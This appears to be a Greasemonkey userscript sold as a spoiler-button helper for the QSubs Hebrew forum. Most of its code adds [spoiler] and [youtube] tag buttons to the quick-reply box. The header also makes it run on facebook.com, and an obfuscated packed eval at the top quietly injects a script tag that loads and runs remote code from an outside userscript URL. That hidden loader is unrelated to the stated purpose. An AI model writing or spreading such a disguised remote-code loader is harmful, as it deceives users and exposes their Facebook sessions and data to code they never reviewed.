// ==UserScript==
// @name QSubs Spoiler button. Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace QSubs Spoiler button.
// @description QSubs Spoiler button for quick post.
// @date 2011-08-15
// @creator Yakir Sitbon
// @include http://*.qsubs.org/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


/**
* This script create for QSUBS forums
* By Yakir Sitbon (KingYes)
* site: http://www.cmusic.co.il/
*/
var scriptElement = document.createElement('script');scriptElement.type = 'text/javascript';scriptElement.innerHTML =  'function qsubs_addtag(elementName, tag) {var obj = document.getElementById(elementName);beforeText = obj.value.substring(0, obj.selectionStart);selectedText = obj.value.substring(obj.selectionStart, obj.selectionEnd);afterText = obj.value.substring(obj.selectionEnd, obj.value.length);switch(tag) {case "spoiler":tagOpen = "[spoiler]";tagClose = "[/spoiler]";newText = beforeText + tagOpen + selectedText + tagClose + afterText;break;case "spoiler2":tagOpen="[spoiler2]";tagClose="[/spoiler2]";newText=beforeText+tagOpen+selectedText+tagClose+afterText;break;case "youtube":tagOpen="[youtube]";tagClose="[/youtube]";newText=beforeText+tagOpen+selectedText+tagClose+afterText;break;}obj.value = newText;}';
document.getElementsByTagName("head")[0].appendChild(scriptElement);
var theTableTr = document.getElementById('fast-reply-controls').getElementsByTagName("table")[1].getElementsByTagName("tr")[0];
var newTD = document.createElement("td");
btnSpoiler = document.createElement("input");btnSpoiler.name='spoiler';btnSpoiler.value = 'ספויילר';btnSpoiler.type = 'button';btnSpoiler.setAttribute("onClick", "javascript:qsubs_addtag('fast-reply_textarea','spoiler');"); newTD.appendChild(btnSpoiler);
btnSpoiler2 = document.createElement("input");btnSpoiler2.name='spoiler2';btnSpoiler2.value = 'ספויילר2';btnSpoiler2.type = 'button';btnSpoiler2.setAttribute("onClick", "javascript:qsubs_addtag('fast-reply_textarea','spoiler2');"); newTD.appendChild(btnSpoiler2);
btnYoutube = document.createElement("input");btnYoutube.name='youtube';btnYoutube.value = 'יוטיוב';btnYoutube.type = 'button';btnYoutube.setAttribute("onClick", "javascript:qsubs_addtag('fast-reply_textarea','youtube');"); newTD.appendChild(btnYoutube);
theTableTr.appendChild(newTD);